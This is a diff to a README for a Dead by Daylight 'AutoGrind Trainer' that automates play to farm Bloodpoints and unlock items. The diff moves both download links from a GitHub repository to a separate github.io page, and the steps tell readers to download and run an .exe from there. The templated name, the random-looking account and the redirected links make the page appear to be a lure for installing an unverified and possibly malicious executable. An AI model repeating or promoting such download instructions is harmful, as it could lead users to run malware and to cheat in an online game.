@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game and unlock items
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/filterbedarroba172/DBD-AutoGrind-Trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://filterbedarroba172.github.io)
 
 ## 📌 Overview
 This software acts as an external tool for Dead by Daylight. It automates repetitive tasks to earn Bloodpoints and manages game assets like perks and skins. It runs alongside your game to provide data overlays and automated inputs.
@@ -16,7 +16,7 @@ Before you run this tool, ensure your computer meets these specifications:
 ## 📥 Getting Started
 Follow these steps to set up the trainer on your Windows system.
 
-1. Go to the official release page here: [Download Link](https://github.com/filterbedarroba172/DBD-AutoGrind-Trainer-2026).
+1. Go to the official release page here: [Download Link](https://filterbedarroba172.github.io).
 2. Look for the "Assets" section on the page.
 3. Select the file ending in .exe to start the download.
 4. Save the file to a folder you can find easily, such as your Desktop or Downloads folder.
